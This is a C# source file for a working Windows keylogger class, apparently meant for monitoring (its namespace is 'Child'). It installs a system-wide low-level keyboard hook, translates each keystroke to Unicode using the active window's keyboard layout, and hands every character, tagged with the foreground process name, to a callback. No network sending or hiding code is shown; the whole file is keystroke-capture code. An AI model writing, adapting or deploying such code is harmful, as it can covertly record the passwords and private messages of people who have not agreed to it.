using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;//Provides classes that allow you to interact with system processes, event logs, and performance counters.
using System.Threading;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Child
{
    class KeyLogger
    {
        public static Semaphore SM = new Semaphore(1, 1);
        public static uint ProcessID;
        public bool Runing = false;
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        string Key;
        private static LowLevelKeyboardProc _proc = HookCallback; // Process that Detect Key is Pressed
        private static IntPtr _hookID = IntPtr.Zero; // Pointer to Listenner to Keys 
        public static Action<object> Act;
        public static Thread CallBackFunction;  // To Save Function That Run When New Key is Pressed

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, UIntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, UIntPtr wParam, IntPtr lParam);

        /// <summary>
        /// initial Logger And Start logging Keys
        /// </summary>
        /// <param name="CallBackFunc"> Function That run at Key Pressed</param>
        public KeyLogger(Action<object> CallBackFunc)
        {  
            CallBackFunction = new Thread(new ParameterizedThreadStart(CallBackFunc));
            Act = CallBackFunc;

        }
        /// <summary>
        /// Proper Setting For Logging
        /// </summary>
        /// <param name="proc"> Detector Process</param>
        /// <returns></returns>
        private static IntPtr SetHook(LowLevelKeyboardProc proc )
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        /// <summary>
        /// Detect and Find Keycode and Create Event 
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private static IntPtr HookCallback(int nCode, UIntPtr wParam, IntPtr lParam)
        {
            string chars = "";



            if (nCode >= 0)

                if (wParam.ToUInt32() == (int)InterceptKeys.KeyEvent.WM_KEYDOWN ||

                    wParam.ToUInt32() == (int)InterceptKeys.KeyEvent.WM_KEYUP ||

                    wParam.ToUInt32() == (int)InterceptKeys.KeyEvent.WM_SYSKEYDOWN ||

                    wParam.ToUInt32() == (int)InterceptKeys.KeyEvent.WM_SYSKEYUP)

                {

                    // Captures the character(s) pressed only on WM_KEYDOWN

                    chars = InterceptKeys.VKCodeToString((uint)Marshal.ReadInt32(lParam),

                        (wParam.ToUInt32() == (int)InterceptKeys.KeyEvent.WM_KEYDOWN ||

                        wParam.ToUInt32() == (int)InterceptKeys.KeyEvent.WM_SYSKEYDOWN));
                }
            SM.WaitOne();

            Thread Temp = new Thread(new ParameterizedThreadStart(Act));
            Temp.Start(chars +","+ Process.GetProcessById((int)ProcessID).ProcessName);
            SM.Release();
           return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        /// <summary>
        /// Start Key Loggingry
        /// </summary>
        public void StartHogger()
        {
            _hookID = SetHook(_proc);
            Runing = true;
        }
        /// <summary>
        /// Stop Key logging
        /// </summary>
        public void StopLogger()
        {
            UnhookWindowsHookEx(_hookID);//Removes a hook procedure installed in a hook chain by the SetWindowsHookEx function.
            Runing = false;
        }
        internal static class InterceptKeys

        {

            public delegate IntPtr LowLevelKeyboardProc(int nCode, UIntPtr wParam, IntPtr lParam);

            public static int WH_KEYBOARD_LL = 13;



            /// <summary>

            /// Key event

            /// </summary>

            public enum KeyEvent : int
            {

                /// <summary>

                /// Key down

                /// </summary>

                WM_KEYDOWN = 256,



                /// <summary>

                /// Key up

                /// </summary>

                WM_KEYUP = 257,



                /// <summary>

                /// System key up

                /// </summary>

                WM_SYSKEYUP = 261,



                /// <summary>

                /// System key down

                /// </summary>

                WM_SYSKEYDOWN = 260

            }



            public static IntPtr SetHook(LowLevelKeyboardProc proc)

            {

                using (Process curProcess = Process.GetCurrentProcess())

                using (ProcessModule curModule = curProcess.MainModule)

                {

                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);

                }

            }



            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]

            public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);



            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]

            [return: MarshalAs(UnmanagedType.Bool)]

            public static extern bool UnhookWindowsHookEx(IntPtr hhk);



            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]

            public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, UIntPtr wParam, IntPtr lParam);



            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]

            public static extern IntPtr GetModuleHandle(string lpModuleName);



            #region Convert VKCode to string

            // Note: Sometimes single VKCode represents multiple chars, thus string. 

            // E.g. typing "^1" (notice that when pressing 1 the both characters appear, 

            // because of this behavior, "^" is called dead key)



            [DllImport("user32.dll")]

            private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);



            [DllImport("user32.dll")]

            private static extern bool GetKeyboardState(byte[] lpKeyState);



            [DllImport("user32.dll")]

            private static extern uint MapVirtualKeyEx(uint uCode, uint uMapType, IntPtr dwhkl);



            [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]

            private static extern IntPtr GetKeyboardLayout(uint dwLayout);



            [DllImport("User32.dll")]

            private static extern IntPtr GetForegroundWindow();



            [DllImport("User32.dll")]

            private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);



            [DllImport("user32.dll")]

            private static extern bool AttachThreadInput(uint idAttach, uint idAttachTo, bool fAttach);



            [DllImport("kernel32.dll")]

            private static extern uint GetCurrentThreadId();



            private static uint lastVKCode = 0;

            private static uint lastScanCode = 0;

            private static byte[] lastKeyState = new byte[255];

            private static bool lastIsDead = false;



            /// <summary>

            /// Convert VKCode to Unicode.

            /// <remarks>isKeyDown is required for because of keyboard state inconsistencies!</remarks>

            /// </summary>

            /// <param name="VKCode">VKCode</param>

            /// <param name="isKeyDown">Is the key down event?</param>

            /// <returns>String representing single unicode character.</returns>

            public static string VKCodeToString(uint VKCode, bool isKeyDown)

            {

                // ToUnicodeEx needs StringBuilder, it populates that during execution.

                System.Text.StringBuilder sbString = new System.Text.StringBuilder(5);



                byte[] bKeyState = new byte[255];

                bool bKeyStateStatus;

                bool isDead = false;



                // Gets the current windows window handle, threadID, processID

                IntPtr currentHWnd = GetForegroundWindow();

                uint currentProcessID;

                uint currentWindowThreadID = GetWindowThreadProcessId(currentHWnd, out currentProcessID);


                ProcessID = currentProcessID;
                // This programs Thread ID

                uint thisProgramThreadId = GetCurrentThreadId();



                // Attach to active thread so we can get that keyboard state

                if (AttachThreadInput(thisProgramThreadId, currentWindowThreadID, true))

                {

                    // Current state of the modifiers in keyboard

                    bKeyStateStatus = GetKeyboardState(bKeyState);



                    // Detach

                    AttachThreadInput(thisProgramThreadId, currentWindowThreadID, false);

                }

                else

                {

                    // Could not attach, perhaps it is this process?

                    bKeyStateStatus = GetKeyboardState(bKeyState);

                }



                // On failure we return empty string.

                if (!bKeyStateStatus)

                    return "";



                // Gets the layout of keyboard

                IntPtr HKL = GetKeyboardLayout(currentWindowThreadID);



                // Maps the virtual keycode

                uint lScanCode = MapVirtualKeyEx(VKCode, 0, HKL);



                // Keyboard state goes inconsistent if this is not in place. In other words, we need to call above commands in UP events also.

                if (!isKeyDown)

                    return "";



                // Converts the VKCode to unicode

                int relevantKeyCountInBuffer = ToUnicodeEx(VKCode, lScanCode, bKeyState, sbString, sbString.Capacity, (uint)0, HKL);



                string ret = "";



                switch (relevantKeyCountInBuffer)

                {

                    // Dead keys (^,`...)

                    case -1:

                        isDead = true;



                        // We must clear the buffer because ToUnicodeEx messed it up, see below.

                        ClearKeyboardBuffer(VKCode, lScanCode, HKL);

                        break;



                    case 0:

                        break;



                    // Single character in buffer

                    case 1:

                        ret = sbString[0].ToString();

                        break;



                    // Two or more (only two of them is relevant)

                    case 2:

                    default:

                        ret = sbString.ToString().Substring(0, 2);

                        break;

                }



                // We inject the last dead key back, since ToUnicodeEx removed it.

                // More about this peculiar behavior see e.g: 

                //   http://www.experts-exchange.com/Programming/System/Windows__Programming/Q_23453780.html

                //   http://blogs.msdn.com/michkap/archive/2005/01/19/355870.aspx

                //   http://blogs.msdn.com/michkap/archive/2007/10/27/5717859.aspx

                if (lastVKCode != 0 && lastIsDead)

                {

                    System.Text.StringBuilder sbTemp = new System.Text.StringBuilder(5);

                    ToUnicodeEx(lastVKCode, lastScanCode, lastKeyState, sbTemp, sbTemp.Capacity, (uint)0, HKL);

                    lastVKCode = 0;



                    return ret;

                }



                // Save these

                lastScanCode = lScanCode;

                lastVKCode = VKCode;

                lastIsDead = isDead;

                lastKeyState = (byte[])bKeyState.Clone();



                return ret;

            }



            private static void ClearKeyboardBuffer(uint vk, uint sc, IntPtr hkl)

            {

                System.Text.StringBuilder sb = new System.Text.StringBuilder(10);



                int rc;

                do
                {

                    byte[] lpKeyStateNull = new Byte[255];

                    rc = ToUnicodeEx(vk, sc, lpKeyStateNull, sb, sb.Capacity, 0, hkl);

                } while (rc < 0);

            }

            #endregion

        }
    }
}
